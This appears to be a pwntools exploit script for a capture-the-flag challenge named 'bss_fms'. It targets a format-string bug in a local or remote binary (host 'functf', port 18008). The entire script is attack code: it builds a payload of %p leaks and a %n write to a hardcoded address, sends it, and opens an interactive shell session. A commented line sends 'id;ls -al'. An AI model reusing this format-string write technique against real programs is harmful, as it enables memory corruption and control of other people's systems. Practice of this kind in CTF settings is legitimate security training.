from pwn import *

if len(sys.argv)==1:
    p=process("linux_server64")
    buf=p.recvuntil("1...\n")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18008)

print "exp : bss_fms"

buf=p.recvuntil("== Let's do bss fms ==\n")
print buf

target_addr = 0x000000000060108C

def make_fms():
    buf="|%13$p|"
    buf="|%14$p|"
    #buf="%12$hhn"
    return buf

def make_fms_check():
    buf=""
    for i in range(15,25):
        buf+="\n%d:%%"%(i)+"%d"%i+"$p"
    buf=buf.replace("%24$p","%24$n")
    print buf
    return buf

i=4
payload=""
payload+="A"*0x6
payload+=make_fms_check()
payload+=p64(target_addr)

p.sendline(payload)
        
#p.sendline("id;ls -al")

p.interactive()
